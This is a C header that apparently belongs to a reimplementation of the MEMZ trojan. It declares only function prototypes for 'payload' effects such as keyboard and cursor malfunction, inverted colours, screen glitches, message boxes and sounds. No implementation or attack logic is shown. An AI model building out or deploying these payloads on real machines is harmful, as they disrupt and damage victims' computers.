#ifndef _MEMZ_PAYLOAD_FUNCTION_H
#define _MEMZ_PAYLOAD_FUNCTION_H

#define _WIN32_WINNT 0x0501

#include <memz/window.h>

void shell_execute(window_t* w);
void keyboard_malfunction(window_t* w);
void cursor_malfunction(window_t* w);
void invert_colors(window_t* w);
void invert_text(window_t* w);
void play_sound(window_t* w);
void message_boxes(window_t* w);
void draw_icons(window_t* w);
void tunnel_vision(window_t* w);
void screen_glitches(window_t* w);
void buzzer(window_t* w);

#endif // _MEMZ_PAYLOAD_FUNCTION_H